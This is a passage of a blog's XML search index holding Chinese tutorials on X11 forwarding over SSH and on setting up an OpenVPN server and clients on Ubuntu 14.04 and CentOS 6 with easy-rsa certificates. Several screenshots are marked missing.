Window图形系统是一个经典的Server&#x2F;Client架构，两者通过正常的网络协议进行通信。可是实现比如：服务器中并未安装桌面环境，通过SSH建立的隧道进行转发后，可以实现在另外一台启动了X Server的机器上，由X Server调用本机硬件资源，在屏幕上显示出界面。在windows下我们可以使用 <code>Xming X Server</code> 这款软件接受远程传输来的绘图的相关指令并在本机绘制。</p><ul><li>前提条件是，服务器端已经开启了X11转发，而系统默认是不开启的，我们需要编辑 <code>/etc/ssh/sshd_config</code> 文件，设置 <code>X11Forwarding yes</code>，然后执行 <code>service sshd restart</code> 命令</li><li>在服务器开启了之后，我们还需要在SSH连接软件中开启类似于 “X11 转移” 的功能，然后打开本地的 <code>X Server</code> 软件，我们在windows下测试使用的软件是 <code>Xming X Server</code> 。</li><li>所有 <code>X Server</code> 启动后默认会监听本地6000端口， <code>X client</code> 通过环境变量DISPLAY获取 <code>X Server</code> 服务地址，例如<br> <code>DISPLAY=localhost:0.0</code> 代表 <code>X Server</code> 在本机6000端口，<br>  <code>DISPLAY=localhost:1.0</code> 代表 <code>X Server</code> 在本机6001端口,依此类推；建立连接之前， <code>X Server</code> 还需要验证 <code>X client</code> 的身份，最常的是基于Cookie机制。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Redhat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建OpenVPN服务器</title>
      <link href="/2015/11/08/ubuntu-openvpn/"/>
      <url>/2015/11/08/ubuntu-openvpn/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>对于vpn以前使用最多的是pptpd这个解决方案，但是pptpd相对于OpenVPN来说，没有OpenVPN安全，而且pptpd在Linux下命令行支持不是很好，稳定性也不如OpenVPN。所以最后就选择OpenVPN来搭建VPN。本文的OpenVPN Server安装在Ubuntu 14.04上安装.有关OpenVPN在CentOS6.6 64bit的配置完全可以使用，已经经过验证。文章后有CentOS详细配置命令及步骤。</p><h2 id="二、OpenVPN原理"><a href="#二、OpenVPN原理" class="headerlink" title="二、OpenVPN原理"></a>二、OpenVPN原理</h2><ol><li>OpenVPN通过使用公开密钥（非对称密钥，加密解密使用不同的key，一个称为Publice key，另外一个是Private key）对数据进行加密的。这种方式称为TLS加密</li><li>OpenVPN使用TLS加密的工作过程是，首先VPN Sevrver端和VPN Client端要有相同的CA证书，双方通过交换证书验证双方的合法性，用于决定是否建立VPN连接。</li><li>然后使用对方的CA证书，把自己目前使用的数据加密方法加密后发送给对方，由于使用的是对方CA证书加密，所以只有对方CA证书对应的Private key才能解密该数据，这样就保证了此密钥的安全性，并且此密钥是定期改变的，对于窃听者来说，可能还没有破解出此密钥，VPN通信双方可能就已经更换密钥了。</li></ol><h2 id="三、安装OpenVPN"><a href="#三、安装OpenVPN" class="headerlink" title="三、安装OpenVPN"></a>三、安装OpenVPN</h2><p>OpenVPN的安装我们分为<code>apt-get</code>方式和源码方式，下面我们只讲解<code>apt-get</code>方式的安装。有关源码方式安装OpenVPN，可自行查询。<code>apt-get</code>方式安装的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install openvpn libssl-dev openssl<br></code></pre></td></tr></table></figure><p>OpenVPN安装完毕后，我们来查看OpenVPN的版本，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openvpn –version<br></code></pre></td></tr></table></figure><p>这里我安装的<code>OpenVPN</code>的版本为<code>2.3.2</code>。<br>我们再来查看下<code>OpenVPN</code>安装时产生的文件，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -L openvpn |more<br></code></pre></td></tr></table></figure><p><code>OpenVPN</code>安装完毕后，我们再来安装<code>easy-rsa</code>,<code>easy-rsa</code>是用来制作<code>OpenVPN</code>相关证书的。安装<code>easy-rsa</code>，使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install easy-rsa<br></code></pre></td></tr></table></figure><p>查看<code>easy-rsa</code>安装的文件，代码如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -L easy-rsa |more<br></code></pre></td></tr></table></figure><p>注：在我的服务器上面<code>easy-rsa</code>已经安装到<code>/usr/share/easy-rsa/</code>目录下。</p><h2 id="四、制作相关证书"><a href="#四、制作相关证书" class="headerlink" title="四、制作相关证书"></a>四、制作相关证书</h2><p>根据第一章节<code>OpenVPN</code>的工作原理，我们可以知道<code>OpenVPN</code>的证书分为三部分：<code>CA证书</code>、<code>Server端证书</code>、<code>Client端证书</code>。下面我们通过<code>easy-rsa</code>分别对其进行制作。</p><ol><li>制作CA证书<br>  <code>OpenVPN</code>与<code>easy-rsa</code>安装完毕后，我们需要在<code>/etc/openvpn/</code>目录下创建<code>easy-rsa</code>文件夹，如下：</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /etc/openvpn/easy-rsa/<br></code></pre></td></tr></table></figure><p>然后把<code>/usr/share/easy-rsa/</code>目录下的所有文件全部复制到<code>/etc/openvpn/easy-rsa/</code>下，如下代码所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -r /usr/share/easy-rsa/* /etc/openvpn/easy-rsa/<br></code></pre></td></tr></table></figure><p>当然，我们也可以直接在<code>/usr/share/easy-rsa/</code>制作相关的证书，但是为了后续的管理证书的方便，我们还是把<code>easy-rsa</code>放在了<code>OpenVPN</code>的启动目录下。</p><p>注意：由于我们现在使用的是<code>Ubuntu</code>系统，所以我们必须切换到<code>root</code>用户下才能制作相关证书，否则<code>easy-rsa</code>会报错。如果是<code>Centos</code>系统，则不存在此问题。因为我一直处于<code>root</code>状态，所以不用切换了，当然，这种一直处于<code>root</code>状态的习惯并不是好习惯，毕竟<code>root</code>太强大了。<br>在开始制作CA证书之前，我们还需要编辑<code>vars</code>文件，进入并修改下面相关选项内容即可。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vi /etc/openvpn/easy-rsa/vars<br><span class="hljs-built_in">export</span> KEY_COUNTRY=”CN”<br><span class="hljs-built_in">export</span> KEY_PROVINCE=”SD”<br><span class="hljs-built_in">export</span> KEY_CITY=”JN”<br><span class="hljs-built_in">export</span> KEY_ORG=”SOIL<span class="hljs-string">&quot;</span><br><span class="hljs-string">export KEY_EMAIL=”abc@abc.com”</span><br><span class="hljs-string">export KEY_OU=”test”</span><br><span class="hljs-string">export KEY_NAME=”test”  </span><br></code></pre></td></tr></table></figure><p><code>vars</code>文件主要用于设置证书的相关组织信息，红色部分的内容可以根据自己的实际情况自行修改。其中<code>export KEY_NAME=”test”</code>这个要记住下，我们下面在制作<code>Server端证书</code>时，会使用到。以上内容，我们也可以使用系统默认的，也就是说不进行修改也是可以使用的。</p><p>然后使用<code>source vars</code>命令使其生效，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> vars<br>./clean-all<br></code></pre></td></tr></table></figure><p>注意：执行<code>clean-all</code>命令会删除当前目录下的<code>keys</code>文件夹。</p><p>现在开始正式制作<code>CA证书</code>：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>然后如果成功的话，会提示类似与下面的提示（我的是windows10，所以提示是这样的）：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>windows7端的提示可能是这样的：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>查看了一下ip，的确连上了。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>注意：上图中的<code>client</code>就是根据<code>client.ovpn</code>，这个文件名来的。</p><p>通过上图，我们可以看到本机确实已经连接到Server端，而且获得的IP地址也确实为<code>10.8.0.6</code>。</p><h2 id="五、在Linux上"><a href="#五、在Linux上" class="headerlink" title="五、在Linux上"></a>五、在Linux上</h2><p>在<code>Windows</code>上测试完毕后，我们现在在切换到<code>Linux</code>系统。这个<code>Linux</code>系统是我的搬瓦工的一个VPS，之前是用来番茄的，现在用来测试一下。它的系统叫我更改成<code>Ubuntu14.04</code>,。</p><p>要在<code>Ubuntu</code>上连接<code>OpenVPN Server端</code>，我们需要先安装<code>OpenVPN</code>软件，如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get -y install openvpn<br></code></pre></td></tr></table></figure><p>安装完毕后，把我们刚刚在Windows系统配置的文件上传到Ubuntu系统中。之前我们先在<code>/etc/openvpn</code>目录下面创建了一个<code>test</code>文件，用于存放上传的那四个文件，然后我们使用<code>FileZilla</code>工具利用SSH上传，上传完成如下：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>注意：上传完毕后，我们不需要修改任何配置文件。因为这几个文件在Windows下已经可以正确连接<code>OpenVPN Server端</code>。</p><p>注意：在连接<code>Server端</code>之前，一定要切换到root用户下。因为在连接<code>Server端</code>时，<code>OpenVPN</code>会在本机创建一个虚拟网卡，如果使用普通用户的话，是没有权限创建虚拟网卡的。</p><p>切换到<code>root</code>用户，使用<code>sudo su</code>命令，然后切换到我们创建的<code>test</code>目录下，然后使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openvpn --config client.ovpn<br></code></pre></td></tr></table></figure><p>如果出现下图的信息，说明已经正确连接Server端。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>现在我们在本机使用<code>ifconfig</code>进行查看，在此建议重新开启一个新的<code>ssh</code>窗口。<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>通过上图，我们可以很明显的看出，本机已经正确连接<code>Server端</code>，并且也在本机虚拟出一个叫<code>tun0</code>的虚拟网卡。</p><p>如果想让<code>Ubuntu</code>开机启动并后台运行的话，可以把这条命令写入<code>rc.local</code>文件中。我们先用下面的命令打开<code>rc.local</code>文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vi /etc/rc.local<br></code></pre></td></tr></table></figure><p>然后将下面的代码录入该文件并保存：<br><code>/usr/sbin/openvpn --config /etc/openvpn/test/client.ovpn &gt;/var/log/openvpn.log &amp;</code></p><p>注意，命令末尾的<code>&amp;</code>符号不能省略，否则将可能阻塞系统的正常启动。同时这个时候，<code>client.ovpn</code>文件中有关证书的配置一定要写成绝对路径，要不然系统会报错。如下：<br>[从之前博客找回的部分信息，此处缺图片，待后期重新尝试。]</p><p>如果是<code>CentOS</code>系统的话，我们首先需要安装<code>epel</code>源，然后安装<code>OpenVPN</code>软件包。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm<br>yum -y install openvpn<br></code></pre></td></tr></table></figure><p>以上安装完毕后，把<code>Windows</code>已经成功连接的<code>Client</code>相关文件上传到<code>CentOS</code>系统中，然后连接方法和<code>Ubuntu</code>系统上一样。</p><p>注意：如果在<code>CentOS</code>系统要开机启动的话，也是和<code>Ubuntu</code>系统是一样的，但是有一点需要指出就是<code>Client</code>相关配置文件不能放在<code>/root</code>目录下。</p><p>因为<code>CentOS</code>的<code>OpenVPN Server</code>配置和<code>Ubuntu</code>基本一样，所以就不再单独写一篇有关<code>CentOS</code>下安装配置<code>OpenVPN Server</code>的文章。下面附上在<code>CentOS</code>下，所有执行的命令。如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rpm -ivh http://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm<br>yum -y install openvpn<br>rpm -ql openvpn<br><span class="hljs-built_in">cat</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/README<br>yum -y install easy-rsa<br>rpm -ql easy-rsa<br><span class="hljs-built_in">cd</span> /usr/share/easy-rsa/2.0/<br>vim vars<br><span class="hljs-built_in">export</span> KEY_COUNTRY=”CN”<br><span class="hljs-built_in">export</span> KEY_PROVINCE=”SD”<br><span class="hljs-built_in">export</span> KEY_CITY=”JN”<br><span class="hljs-built_in">export</span> KEY_ORG=”SOIL”<br><span class="hljs-built_in">export</span> KEY_EMAIL=”abc@abc.com”<br><span class="hljs-built_in">export</span> KEY_OU=”SOIL”<br><span class="hljs-built_in">export</span> KEY_NAME=”<span class="hljs-built_in">test</span>”<br><span class="hljs-built_in">source</span> vars<br>./clean-all<br>./build-ca<br>./build-key-server <span class="hljs-built_in">test</span><br>./build-dh<br>./build-key centos<br><span class="hljs-built_in">cd</span>  keys<br><span class="hljs-built_in">cp</span> ca.crt test.key test.crt dh2048.pem /etc/openvpn/<br><span class="hljs-built_in">cp</span> ca.crt centos.key centos.crt /root/<br><span class="hljs-built_in">cp</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/client.conf /root<br><span class="hljs-built_in">cp</span> /usr/share/doc/openvpn-2.3.7/sample/sample-config-files/server.conf /etc/openvpn/<br></code></pre></td></tr></table></figure><p>服务器端配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/openvpn/server.conf<br>grep -vE “;|#|^$” /etc/openvpn/server.conf<br>port 1194<br>proto udp<br>dev tun<br>ca ca.crt<br>cert test.crt<br>key test.key<br>dh dh2048.pem<br>server 10.8.0.0 255.255.255.0<br>ifconfig-pool-persist ipp.txt<br>keepalive 10 120<br>comp-lzo<br>persist-key<br>persist-tun<br>status openvpn-status.log<br>verb 3<br></code></pre></td></tr></table></figure><p>客户端配置文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -vE “;|#|^$” centos.conf<br>client<br>dev tun<br>proto udp<br>remote 182.254.223.140 1194<br>resolv-retry infinite<br>nobind<br>persist-key<br>persist-tun<br>ca ca.crt<br>cert centos.crt<br>key centos.key<br>remote-cert-tls server<br>comp-lzo<br>verb 3<br></code></pre></td></tr></table></figure><p>以上信息参考网络上的信息，自己亲身实践并整理一番，有不对之处，请告知。（测试时间：2015年11月8日）</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
